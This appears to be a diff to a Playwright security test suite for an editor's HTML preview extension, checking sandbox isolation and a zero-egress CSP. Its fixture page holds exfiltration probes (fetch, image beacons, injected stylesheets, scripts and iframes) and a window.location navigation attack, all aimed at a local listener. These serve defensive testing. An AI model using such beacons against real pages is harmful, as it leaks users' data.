@@ -1,5 +1,6 @@
 import { test, expect, type Browser, type Page, type Frame } from '@playwright/test';
 import { mkdirSync, writeFileSync, rmSync } from 'node:fs';
+import { createServer, type Server as HttpServer, type IncomingMessage, type ServerResponse } from 'node:http';
 import { join } from 'path';
 import {
     getProjectId,
@@ -11,32 +12,67 @@ import {
     csrfFetch,
 } from './helpers';
 
-// HTML preview extension — end-to-end: installs the local extension via
+// HTML preview extension — end-to-end. Installs the local extension via
 // install-local, then verifies the Preview button (HTML-family only), the
-// rendered preview (scripts run, root-relative + relative sibling assets
-// load), and the preview-as-code-view-mirror contract: unsaved code-view
-// edits refresh the preview live, and external on-disk changes flow
-// code-view → preview in both the explorer and the task view. Also covers
-// host isolation (the previewed page probes its own sandbox: no host
-// DOM/storage/cookies, host API responses CORS-rejected). Fixtures live in
-// a uniquely named /tmp/kanban-test-repo subdir removed in afterAll.
+// preview-as-code-view-mirror contract (unsaved edits + external on-disk
+// changes refresh the preview live), and the security model against a local
+// egress listener:
+//  - DEFAULT (scripts off): bare sandbox — a static page renders like a
+//    no-JS browser, no dynamic data leaves, and there is no self-navigation
+//    at all (the sandbox refuses even <meta refresh>).
+//  - SCRIPTS ON: strict zero-egress CSP, opaque-origin isolation; external
+//    self-navigation is blocked in flight by the host's frame-src 'self',
+//    allowed same-origin navs (incl. <meta refresh>) are contained by the
+//    load-event watchdog (frame reset, token released, warned).
+// Fixtures live in a uniquely named /tmp/kanban-test-repo subdir, removed in afterAll.
 
 const TEST_REPO = '/tmp/kanban-test-repo';
 const TS = Date.now();
 const FIXTURE_DIR = `${TEST_REPO}/html-preview-${TS}`;
 const PAGE_FILE = 'index.html';
+const REFRESH_FILE = 'meta-refresh.html';
 const CSS_FILE = 'style.css';
 const REL_CSS_FILE = 'rel.css';
 const SVG_FILE = 'logo.svg';
 
-// style.css is referenced root-relative (rewritten by the extension);
-// rel.css relatively — both paths covered.
-const HTML_FIXTURE = `<!DOCTYPE html>
+// Egress listener: records every request a previewed page sends outside the
+// preview origin. Only the scripts-off previews' AUTHOR-WRITTEN static refs
+// (STATIC_REFS) may legitimately arrive; scripts-on previews (strict CSP) may
+// send nothing — including the deliberate nav attack. Serves valid content per
+// path so an opened channel actually loads (and is counted).
+let egressServer: HttpServer;
+let egressBase = '';
+const egressRequests: string[] = [];
+const STATIC_REFS = ['/style-static?ref=css', '/img-static?ref=img', '/frame-static?ref=frame'];
+
+function handleEgress(req: IncomingMessage, res: ServerResponse) {
+  egressRequests.push(`${req.method} ${req.url}`);
+  const url = req.url || '';
+  if (url.startsWith('/image') || url.startsWith('/img')) {
+    // 1x1 GIF so an unblocked <img> beacon would fire onload.
+    res.writeHead(200, { 'Content-Type': 'image/gif' });
+    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+    return;
+  }
+  if (url.startsWith('/style')) { res.writeHead(200, { 'Content-Type': 'text/css' }); res.end('/* egress */'); return; }
+  if (url.startsWith('/script')) { res.writeHead(200, { 'Content-Type': 'text/javascript' }); res.end('/* egress */'); return; }
+  res.writeHead(200, { 'Content-Type': 'text/html' });
+  res.end('<html><body>egress</body></html>');
+}
+
+// Fixture page. The STATIC_REFS resources are author-written (safe: a
+// scriptless page can only request what its author wrote). The <script> probes
+// are INERT in scripts-off mode and run under the strict CSP in the scripts-on
+// test (where every dynamic channel must be blocked). Built in beforeAll.
+let HTML_FIXTURE = '';
+function buildHtmlFixture(exfilBase: string): string {
+  return `<!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
   <link rel="stylesheet" href="/${CSS_FILE}">
   <link rel="stylesheet" href="${REL_CSS_FILE}">
+  <link rel="stylesheet" href="${exfilBase}/style-static?ref=css">
 </head>
 <body>
   <h1 id="title">HTML Preview Fixture</h1>
@@ -44,15 +80,18 @@ const HTML_FIXTURE = `<!DOCTYPE html>
   <div id="styled">styled box</div>
   <div id="rel-box">relative box</div>
   <img id="data-img" alt="dot" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12'%3E%3Crect width='12' height='12' fill='limegreen'/%3E%3C/svg%3E">
+  <img id="remote-img" alt="remote" width="1" height="1" src="${exfilBase}/img-static?ref=img">
+  <iframe id="remote-frame" src="${exfilBase}/frame-static?ref=frame" style="width:0;height:0;border:0" title="remote"></iframe>
   <div id="probes"></div>
   <script>document.getElementById('js-target').textContent = 'JS-RAN-42';</script>
   <script>
-    // Isolation probes: run from inside the previewed page (opaque origin,
-    // sandboxed without allow-same-origin) and report what the browser lets
-    // it do. All host-side access must be blocked.
+    // Isolation + exfiltration probes (inert with scripts off); under
+    // scripts-on + strict CSP, host access and every egress channel must be blocked.
     (function () {
+      const EXFIL = '%%EXFIL_BASE%%';
       const r = {};
-      const done = () => { document.getElementById('probes').textContent = JSON.stringify(r); };
+      const attempts = [];
+      const track = (p) => attempts.push(Promise.resolve(p).catch(() => {}));
       try { void window.top.document.title; r.topDom = 'read'; }
       catch (e) { r.topDom = 'blocked'; }
       try { void window.localStorage; r.storage = 'available'; }
@@ -60,14 +99,43 @@ const HTML_FIXTURE = `<!DOCTYPE html>
       try { void document.cookie; r.cookie = 'readable'; }
       catch (e) { r.cookie = 'blocked'; }
       fetch('/api/projects').then(
-        () => { r.api = 'readable'; done(); },
-        () => { r.api = 'rejected'; done(); }
+        () => { r.api = 'readable'; },
+        () => { r.api = 'rejected'; }
       );
+      // fetch/XHR/WebSocket class -> connect-src 'none'
+      track(fetch(EXFIL + '/fetch?leak=dynamic').then(
+        () => { r.exfilFetch = 'sent'; },
+        () => { r.exfilFetch = 'blocked'; }
+      ));
+      // Image beacon -> img-src 'self' data: blob:
+      const img = new Image();
+      track(new Promise((res) => {
+        img.onload = () => { r.exfilImage = 'sent'; res(); };
+        img.onerror = () => { r.exfilImage = 'blocked'; res(); };
+        img.src = EXFIL + '/image?leak=dynamic';
+      }));
+      // Stylesheet/script load -> style-src / script-src (a wildcard there is a
+      // live exfil channel — the load request itself carries the URL).
+      const style = document.createElement('link');
+      style.rel = 'stylesheet';
+      style.href = EXFIL + '/style?leak=dynamic';
+      document.head.appendChild(style);
+      const script = document.createElement('script');
+      script.src = EXFIL + '/script?leak=dynamic';
+      document.head.appendChild(script);
+      // External frame -> frame-src 'none'
+      const frame = document.createElement('iframe');
+      frame.src = EXFIL + '/frame?leak=dynamic';
+      document.body.appendChild(frame);
+      track(Promise.allSettled(attempts).then(() => {
+        document.getElementById('probes').textContent = JSON.stringify(r);
+      }));
     })();
   </script>
 </body>
-</html>
-`;
+</html>`
+    .replace(/%%EXFIL_BASE%%/g, () => exfilBase);
+}
 
 const CSS_FIXTURE = `#styled {
   color: rgb(255, 0, 85);
@@ -82,6 +150,23 @@ const REL_CSS_FIXTURE = `#rel-box {
 `;
 
 const SVG_FIXTURE = `<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="40" height="40" fill="teal"/></svg>`;
+
+// Meta-refresh fixture: <meta refresh> is the only non-script self-navigation
+// a page has; same-origin target (/api/health), allowed by the host's
+// frame-src 'self'. Scripts OFF: the bare sandbox refuses the redirect (it
+// requires the allow-scripts keyword) — the preview stays. Scripts ON: the
+// nav happens and the watchdog contains it. 2s delay: observe the static
+// render first.
+const REFRESH_FIXTURE = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="refresh" content="2;url=/api/health">
+</head>
+<body>
+  <h1 id="title">META-REFRESH</h1>
+</body>
+</html>`;
 
 // Task-view fixture (lives in a task worktree): minimal page, one title.
 const TASK_FIXTURE = (tag: string) =>
@@ -177,8 +262,15 @@ test.describe.serial('HTML Preview extension', () => {
   let extId = '';
 
   test.beforeAll(async ({ browser }) => {
+    // Egress listener first — the fixture's exfil probes need its URL.
+    egressServer = createServer(handleEgress);
+    await new Promise<void>((resolve) => egressServer.listen(0, '127.0.0.1', resolve));
+    egressBase = `http://127.0.0.1:${(egressServer.address() as { port: number }).port}`;
+    HTML_FIXTURE = buildHtmlFixture(egressBase);
+
     mkdirSync(FIXTURE_DIR, { recursive: true });
     writeFileSync(join(FIXTURE_DIR, PAGE_FILE), HTML_FIXTURE);
+    writeFileSync(join(FIXTURE_DIR, REFRESH_FILE), REFRESH_FIXTURE);
     writeFileSync(join(FIXTURE_DIR, CSS_FILE), CSS_FIXTURE);
     writeFileSync(join(FIXTURE_DIR, REL_CSS_FILE), REL_CSS_FIXTURE);
     writeFileSync(join(FIXTURE_DIR, SVG_FILE), SVG_FIXTURE);
@@ -194,6 +286,14 @@ test.describe.serial('HTML Preview extension', () => {
   });
 
   test.afterAll(async ({ browser }) => {
+    // Final egress audit: only the scripts-off author-written static refs may have arrived.
+    const unexpectedEgress = egressRequests.filter(
+        r => !STATIC_REFS.some(ref => r.includes(ref)),
+    );
+    if (unexpectedEgress.length > 0) {
+      throw new Error(`unexpected egress requests — exfiltration possible: ${unexpectedEgress.join(', ')}`);
+    }
+    if (egressServer) await new Promise<void>((resolve) => egressServer.close(() => resolve()));
     try {
       if (extId) {
         const { context, page } = await setupPage(browser);
@@ -228,31 +328,89 @@ test.describe.serial('HTML Preview extension', () => {
     await expect(previewButton(page)).toBeVisible({ timeout: 10000 });
   });
 
-  test('clicking Preview renders the file: scripts run and sibling assets load', async ({ page }) => {
+  test('default preview: scripts off, static page renders, remote resources load, nothing dynamic leaves', async ({ page }) => {
     await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
     const btn = previewButton(page);
     await expect(btn).toBeVisible({ timeout: 10000 });
 
+    // Capture the doc's server-set CSP header (inline meta tags can only tighten it).
+    const docResponse = page.waitForResponse(
+        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
+    );
     await btn.click();
+    const csp = (await docResponse).headers()['content-security-policy'] || '';
+    // Scripts off → permissive CSP is safe (a scriptless page is fully static).
+    expect(csp, 'scripts-off preview served with the permissive CSP').toContain('connect-src *');
 
     // Code view hidden, overlay shown.
     await expect(page.locator('.file-editor.active .editor-wrapper')).toHaveCSS('display', 'none', { timeout: 10000 });
     await expect(btn).toHaveClass(/active/);
 
+    // Bare sandbox attribute (no tokens → no scripts, inherited by embedded iframes).
+    const extFrame = page.frames().find(fr => fr.url().includes('/extensions/') && fr.url().includes('html-preview'));
+    expect(extFrame, 'extension frame present').toBeTruthy();
+    const sandbox = await extFrame!.locator('#preview-frame').getAttribute('sandbox');
+    expect(sandbox, 'nested frame sandbox attribute (scripts off)').toBe('');
+
     const frame = await previewFrameOf(page);
 
-    // Inline <script> executed in the preview document.
-    await expect(frame.locator('#js-target')).toHaveText('JS-RAN-42', { timeout: 15000 });
-
+    // Static content + local sibling assets render.
+    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });
     // Root-relative /style.css — rewritten to file-relative by the extension.
     await expect(frame.locator('#styled')).toHaveCSS('color', 'rgb(255, 0, 85)', { timeout: 15000 });
     await expect(frame.locator('#styled')).toHaveCSS('background-color', 'rgb(10, 20, 30)');
-
     // Relative rel.css also loads.
     await expect(frame.locator('#rel-box')).toHaveCSS('color', 'rgb(0, 170, 170)');
-
     // data: image renders.
     await expect(frame.locator('#data-img')).toBeVisible();
+
+    // Scripts are OFF: the fixture's inline script never ran.
+    await expect(frame.locator('#js-target')).toHaveText('before');
+
+    // Remote static (author-written) resources DID load — no-JS-browser rendering.
+    const baseline = 0; // first preview open of the run
+    await expect.poll(
+        () => egressRequests.filter(req => STATIC_REFS.some(ref => req.includes(ref))).length,
+        { timeout: 15000 },
+    ).toBe(baseline + STATIC_REFS.length);
+    // And no request may carry dynamic data.
+    expect(egressRequests, 'no request may carry dynamic data').not.toContainEqual(expect.stringContaining('leak='));
+
+    // Toggle off → code view restored.
+    await btn.click();
+    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
+    await expect(btn).not.toHaveClass(/active/);
+  });
+
+  test('scripts-off meta-refresh: the bare sandbox refuses the redirect, preview stays', async ({ page }) => {
+    // Both toggles explicitly off (the default; makes the test order-independent).
+    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: false, allow_network: false } } });
+
+    await openFile(page, [`html-preview-${TS}`, REFRESH_FILE]);
+    const btn = previewButton(page);
+    await expect(btn).toBeVisible({ timeout: 10000 });
+
+    const docResponse = page.waitForResponse(
+        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
+    );
+    await btn.click();
+    const docUrl = (await docResponse).url();
+
+    // The static page renders (the refresh fires after 2s).
+    const frame = await previewFrameOf(page);
+    await expect(frame.locator('#title')).toHaveText('META-REFRESH', { timeout: 10000 });
+
+    // Well past the 2s refresh window: the bare sandbox refused the redirect
+    // (it requires the allow-scripts keyword) — nothing navigated, the token
+    // is still live, no warning. The scripts-off guarantee: zero
+    // self-navigation, including <meta refresh>.
+    await page.waitForTimeout(4000);
+    await expect(frame.locator('#title')).toHaveText('META-REFRESH');
+    await expect.poll(
+        async () => (await page.request.get(docUrl)).status(),
+        { timeout: 5000 },
+    ).toBe(200);
+    await expect(page.locator('[data-ext-status]', { hasText: 'navigate away' })).toHaveCount(0);
 
     // Toggle off → code view restored.
     await btn.click();
@@ -269,9 +427,7 @@ test.describe.serial('HTML Preview extension', () => {
     const frame = await previewFrameOf(page);
     await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });
 
-    // Edit the code view only (CodeMirror dispatch; the on-disk file is
-    // untouched). The preview mirrors the code view, so it must follow the
-    // unsaved buffer.
+    // Edit the code view only (disk untouched) — the preview must follow the unsaved buffer.
     const bufferOnly = `LIVE-BUFFER-${TS}`;
     const newContent = HTML_FIXTURE.replace('HTML Preview Fixture', bufferOnly);
     await page.evaluate((content) => {
@@ -281,12 +437,10 @@ test.describe.serial('HTML Preview extension', () => {
       });
     }, newContent);
 
-    // Extension debounce (300ms) + re-serve: the preview must pick up the
-    // buffer content without any save or disk write.
+    // After the extension's 300ms debounce + re-serve, the buffer content is live (no save, no disk write).
     await expect.poll(() => previewTitle(page), { timeout: 15000 }).toContain(bufferOnly);
 
-    // Toggle off, then drop the persisted editor draft so later tests open
-    // with a clean (disk-matching) buffer.
+    // Toggle off and drop the persisted editor draft so later tests open clean.
     await btn.click();
     await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
     const filePath = join(FIXTURE_DIR, PAGE_FILE);
@@ -313,8 +467,8 @@ test.describe.serial('HTML Preview extension', () => {
     const frame = await previewFrameOf(page);
     await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });
 
-    // Change the file on disk (terminal/agent/git equivalent). The fs watcher
-    // (500ms) must reconcile the code view, and the preview must mirror it.
+    // Change the file on disk (terminal/agent equivalent); the fs watcher (500ms)
+    // reconciles the code view, and the preview must mirror it.
     const updated = `LIVE-DISK-${TS}`;
     const newContent = HTML_FIXTURE.replace('HTML Preview Fixture', updated);
     const filePath = join(FIXTURE_DIR, PAGE_FILE);
@@ -335,32 +489,109 @@ test.describe.serial('HTML Preview extension', () => {
     }
   });
 
-  test('previewed page is isolated from the host', async ({ page }) => {
+  test('scripts-on preview: strict zero-egress CSP + navigation watchdog', async ({ page }) => {
+    // Opt into scripts (extension setting; read at extension init → reopen).
+    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true } } });
+
     await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
     const btn = previewButton(page);
     await expect(btn).toBeVisible({ timeout: 10000 });
-    await btn.click();
 
-    // The nested iframe's sandbox attribute is the whole isolation model:
-    // scripts run, but without allow-same-origin the page gets an opaque
-    // origin. Assert it as deployed, then verify the consequences from
-    // inside the previewed document itself (its own probes).
+    const docResponse = page.waitForResponse(
+        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
+    );
+    await btn.click();
+    const docUrl = (await docResponse).url();
+    const csp = (await docResponse).headers()['content-security-policy'] || '';
+
+    // Strict policy: no '*' in any load-type directive (a wildcard there is a live exfil channel).
+    expect(csp, 'strict CSP on the preview doc').toContain("connect-src 'none'");
+    expect(csp, 'no wildcard in any load-type directive').not.toMatch(
+        /(script|style|img|font|media|frame|worker|object)-src[^;]*\*/);
+
+    // allow-scripts token set (still no allow-same-origin → opaque origin).
     const extFrame = page.frames().find(fr => fr.url().includes('/extensions/') && fr.url().includes('html-preview'));
     expect(extFrame, 'extension frame present').toBeTruthy();
     const sandbox = await extFrame!.locator('#preview-frame').getAttribute('sandbox');
-    expect(sandbox, 'nested preview iframe sandbox attribute').toBe('allow-scripts');
+    expect(sandbox, 'nested frame sandbox attribute (scripts on)').toBe('allow-scripts');
 
     const frame = await previewFrameOf(page);
     await expect(frame.locator('#probes')).not.toHaveText('', { timeout: 15000 });
     const probes = JSON.parse((await frame.locator('#probes').textContent())!);
+
+    // Opaque-origin host isolation.
     expect(probes.topDom, 'host DOM unreadable').toBe('blocked');
     expect(probes.storage, 'Web Storage unavailable').toBe('blocked');
     expect(probes.cookie, 'host cookies (session/CSRF) unreadable').toBe('blocked');
-    // The server sets no CORS headers: cross-origin (opaque-origin) reads of
-    // any host API response are rejected, so the page can't exfiltrate data.
     expect(probes.api, 'host API responses unreadable (CORS)').toBe('rejected');
+    // Every script-driven egress channel closed by the strict CSP.
+    expect(probes.exfilFetch, 'fetch/XHR beacon blocked (connect-src none)').toBe('blocked');
+    expect(probes.exfilImage, 'image beacon blocked (img-src restricted)').toBe('blocked');
 
+    // With scripts on, even the static refs must be blocked — no new egress beyond
+    // the scripts-off ones from earlier tests.
+    const expectedStaticCount = egressRequests.filter(req => STATIC_REFS.some(ref => req.includes(ref))).length;
+    await expect.poll(
+        () => egressRequests.filter(req => STATIC_REFS.some(ref => req.includes(ref))).length,
+        { timeout: 10000 },
+    ).toBe(expectedStaticCount);
+    expect(egressRequests, 'no dynamic egress with scripts on').not.toContainEqual(expect.stringContaining('leak='));
+
+    // window.location self-navigation: a child frame's navigation is governed by
+    // the embedding document's frame-src (host CSP: 'self'), so the attempt never
+    // reaches the listener; the blocked nav's error load fires the watchdog
+    // (frame reset, token killed, user warned, editor restored).
+    const egressBeforeNav = egressRequests.length;
+    await frame.evaluate((nav) => { window.location = nav; }, `${egressBase}/nav?leak=nav-attack`);
+
+    // The watchdog reset the frame: no /api/preview frame left.
+    await expect.poll(
+        () => page.frames().some(fr => fr.url().includes('/api/preview/')),
+        { timeout: 10000 },
+    ).toBe(false);
+    // Nothing reached the listener — the navigation was blocked in flight.
+    expect(egressRequests, 'blocked navigation must not reach the egress listener').toHaveLength(egressBeforeNav);
+    // The served doc's token is dead (release is async: postMessage → DELETE).
+    await expect.poll(
+        async () => (await page.request.get(docUrl)).status(),
+        { timeout: 10000 },
+    ).toBe(404);
+    // The user is told what happened.
+    await expect(page.locator('[data-ext-status]', { hasText: 'navigate away' })).toBeVisible({ timeout: 10000 });
+    // The editor is back.
+    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
+  });
+
+  test('scripts-on meta-refresh: same-origin navigation is allowed, the watchdog contains it', async ({ page }) => {
+    // Scripts on (the setting is read at extension init — reopen the file).
+    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true, allow_network: false } } });
+
+    await openFile(page, [`html-preview-${TS}`, REFRESH_FILE]);
+    const btn = previewButton(page);
+    await expect(btn).toBeVisible({ timeout: 10000 });
+
+    const docResponse = page.waitForResponse(
+        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
+    );
     await btn.click();
+    const docUrl = (await docResponse).url();
+
+    const frame = await previewFrameOf(page);
+    await expect(frame.locator('#title')).toHaveText('META-REFRESH', { timeout: 10000 });
+
+    // With scripts on the redirect runs, and the same-origin target is
+    // allowed by the host's frame-src 'self' (the doc's CSP does not govern
+    // its own navigation) — so the frame really navigates; the WATCHDOG
+    // (not CSP) contains it.
+    await expect.poll(
+        () => page.frames().some(fr => fr.url().includes('/api/preview/')),
+        { timeout: 15000 },
+    ).toBe(false);
+    await expect.poll(
+        async () => (await page.request.get(docUrl)).status(),
+        { timeout: 10000 },
+    ).toBe(404);
+    await expect(page.locator('[data-ext-status]', { hasText: 'navigate away' })).toBeVisible({ timeout: 10000 });
     await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
   });
 
